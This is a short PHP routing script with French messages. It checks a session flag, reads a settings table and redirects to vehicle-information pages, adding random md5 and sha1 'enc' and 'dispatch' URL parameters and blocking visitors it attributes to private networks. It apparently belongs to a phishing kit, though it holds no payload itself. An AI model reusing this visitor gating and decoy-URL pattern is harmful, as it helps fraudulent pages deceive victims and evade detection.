<?php 
include('../dashboard/settings.php');
session_start();
if(isset($_SESSION['authorized']))
{
try{	
$base = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
$base->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$stmt = $base->prepare('SELECT * FROM settings');   
$stmt->setFetchMode(PDO::FETCH_ASSOC);
$stmt->execute();
$rows = $stmt->fetchAll();
foreach ($rows as $row) {

		  /*
		  Vérification page explain est activé ou non
		  */
          if($row['wexplain'] == "1"){
          	header('Location: obligation.php?&enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
          }
          else{
			header('Location: infos-vehicule.php?&enc='.md5(time()).'&p=0&dispatch='.sha1(time()));		
          }
}
	}catch(PDOException $exe){
              header('Location: ../index.php?error=true&enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
            }
}
else{
die("LA REQUÊTE A ÉTÉ REFUSÉE : VÉRIFIEZ QUE VOUS N'ÊTES PAS CONNECTÉ À UN RÉSEAU PRIVÉ" );   
}


?>